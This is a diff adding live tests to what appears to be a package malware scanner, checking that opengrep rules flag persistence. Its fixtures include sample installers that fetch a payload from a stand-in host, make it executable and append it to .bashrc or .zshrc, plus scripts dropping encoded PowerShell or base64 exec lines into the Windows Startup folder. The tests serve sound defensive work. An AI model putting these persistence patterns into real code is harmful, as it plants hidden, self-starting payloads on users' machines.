@@ -285,3 +285,152 @@ def test_live_opengrep_keeps_four_incomplete_analysis_contracts_visible(make_pac
         "broken.py": "python_syntax_error",
         "oversize.py": "python_oversize",
     }
+
+
+def test_live_remote_shell_rc_persistence_is_structurally_correlated(make_package):
+    positive = """\
+import os
+import urllib.request
+
+def install():
+    payload = urllib.request.urlopen('https://example.invalid/payload').read()
+    payload_path = os.path.join(os.path.expanduser('~'), '.worker')
+    with open(payload_path, 'wb') as output:
+        output.write(payload)
+    os.chmod(payload_path, 0o755)
+    startup_path = os.path.join(os.path.expanduser('~'), '.bashrc')
+    with open(startup_path, 'a') as startup:
+        startup.write(f'\\n{payload_path} &')
+"""
+    zsh_positive = positive.replace("'.bashrc'", "'.zshrc'")
+    remote_without_persistence = """\
+import os
+import urllib.request
+payload = urllib.request.urlopen('https://example.invalid/tool').read()
+path = '/tmp/tool'
+with open(path, 'wb') as output:
+    output.write(payload)
+os.chmod(path, 0o755)
+"""
+    local_startup_setup = """\
+import os
+def install(path):
+    os.chmod(path, 0o755)
+    startup_path = os.path.join(os.path.expanduser('~'), '.bashrc')
+    with open(startup_path, 'a') as startup:
+        startup.write(f'\\n{path} &')
+"""
+    unrelated_startup_write = """\
+import os
+import urllib.request
+def install():
+    payload = urllib.request.urlopen('https://example.invalid/tool').read()
+    path = os.path.expanduser('~/.worker')
+    with open(path, 'wb') as output:
+        output.write(payload)
+    os.chmod(path, 0o755)
+    with open(os.path.expanduser('~/.bashrc'), 'a') as startup:
+        startup.write('alias ll="ls -la"')
+"""
+    parsed = parse.parse_package(ingest.build_package(str(make_package({
+        "positive.py": positive,
+        "zsh-positive.py": zsh_positive,
+        "download-only.py": remote_without_persistence,
+        "local-startup.py": local_startup_setup,
+        "unrelated-startup.py": unrelated_startup_write,
+    }))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+    persistence = [finding for finding in findings if finding.vector == "SXV-039"]
+
+    assert [(finding.path, finding.rule) for finding in persistence] == [
+        ("positive.py", "opengrep-remote-shell-rc-persistence"),
+        ("zsh-positive.py", "opengrep-remote-shell-rc-persistence"),
+    ]
+
+
+def test_live_windows_startup_write_is_structurally_correlated(make_package):
+    startup_write = """\
+from pathlib import Path
+def install():
+    startup = Path.home() / 'AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+    (startup / 'worker.cmd').write_text('powershell -enc AAAA')
+"""
+    ordinary_appdata_write = """\
+from pathlib import Path
+def configure():
+    config = Path.home() / 'AppData' / 'Roaming' / 'Acme'
+    target = config / 'settings.json'
+    with open(target, 'w') as output:
+        output.write('{}')
+"""
+    parsed = parse.parse_package(ingest.build_package(str(make_package({
+        "startup.py": startup_write,
+        "config.py": ordinary_appdata_write,
+    }))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+    persistence = [finding for finding in findings if finding.vector == "SXV-039"]
+
+    assert [(finding.path, finding.rule) for finding in persistence] == [
+        ("startup.py", "opengrep-windows-startup-persistence"),
+    ]
+
+
+def test_live_windows_startup_write_keeps_computed_target_coverage(make_package):
+    startup_write = (
+        "from pathlib import Path\n\ndef install():\n"
+        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
+        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
+        "    target = startup / 'worker.py'\n"
+        "    with open(target, 'w') as output:\n"
+        "        output.write(\"exec(base64.b64decode('AAAA'))\")\n"
+    )
+    parsed = parse.parse_package(ingest.build_package(str(make_package({
+        "computed.py": startup_write,
+    }))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+
+    assert [
+        (finding.path, finding.rule)
+        for finding in findings
+        if finding.vector == "SXV-039"
+    ] == [("computed.py", "opengrep-windows-startup-write")]
+
+
+def test_live_windows_startup_read_is_not_persistence(make_package):
+    startup_read = (
+        "from pathlib import Path\n\ndef inspect():\n"
+        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
+        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
+        "    target = startup / 'framework_config.json'\n"
+        "    with open(target, 'r') as source:\n"
+        "        return source.read()\n"
+    )
+    parsed = parse.parse_package(ingest.build_package(str(make_package({
+        "read.py": startup_read,
+    }))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+
+    assert not [finding for finding in findings if finding.vector == "SXV-039"]
+
+
+@pytest.mark.parametrize("mode", ["wb+", "w+b", "ab+", "a+b", "xb+", "x+b"])
+def test_live_windows_startup_write_accepts_binary_update_modes(make_package, mode):
+    startup_write = (
+        "from pathlib import Path\n\ndef install():\n"
+        "    startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' "
+        "/ 'Start Menu' / 'Programs' / 'Startup'\n"
+        "    target = startup / 'worker.py'\n"
+        f"    with open(target, '{mode}') as output:\n"
+        "        output.write(b\"exec(base64.b64decode('AAAA'))\")\n"
+    )
+    parsed = parse.parse_package(ingest.build_package(str(make_package({
+        "write.py": startup_write,
+    }))))
+
+    findings = opengrep_check(parsed, executable=_live_executable(), timeout=90)
+
+    assert any(finding.vector == "SXV-039" for finding in findings)
